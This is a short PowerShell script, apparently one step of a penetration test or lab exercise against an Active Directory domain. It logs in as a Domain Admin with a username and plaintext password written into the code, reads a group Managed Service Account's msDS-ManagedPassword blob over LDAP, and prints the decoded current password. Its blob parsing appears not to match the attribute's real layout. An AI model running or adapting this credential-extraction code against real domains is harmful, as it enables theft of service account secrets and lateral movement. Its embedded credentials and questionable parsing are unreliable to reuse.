# T024 — validate gMSA password by installing/using the credential (DA on dc01)
$ErrorActionPreference = 'Continue'
$tools = 'C:\Windows\Temp\cadre-tools'

# Method 1: Read msDS-ManagedPassword via ADSI as DA (works for DA)
try {
  $g = New-Object System.DirectoryServices.DirectoryEntry("LDAP://dc01.cadre.local/CN=gmsaTools,CN=Managed Service Accounts,DC=cadre,DC=local", 'chief_command', 'C0mm@nd_Ch1ef!')
  $g.RefreshCache(@('msDS-ManagedPassword'))
  $blob = $g.Properties['msDS-ManagedPassword'].Value
  if ($blob) {
    Write-Output "BLOB_LEN $($blob.Length)"
    $off = 0
    $ver = [BitConverter]::ToInt32($blob, 0); $off += 8
    $l0 = [BitConverter]::ToInt32($blob, $off); $off += 4
    Write-Output "VER $ver L0 $l0"
    if ($l0 -gt 0 -and $l0 -lt 512) {
      $cur = [System.Text.Encoding]::Unicode.GetString($blob, $off, $l0)
      Write-Output "CURRENT_PW: $cur"
    }
  } else {
    Write-Output 'BLOB_MISSING'
  }
} catch { Write-Output "ADSI_ERR $($_.Exception.Message)" }

# Method 2: Install-ADServiceAccount test (requires module)
try {
  Import-Module ActiveDirectory -ErrorAction Stop
  Write-Output "ADMODULE_OK"
} catch { Write-Output 'ADMODULE_MISSING' }
Write-Output 'T024_CHK_DONE'
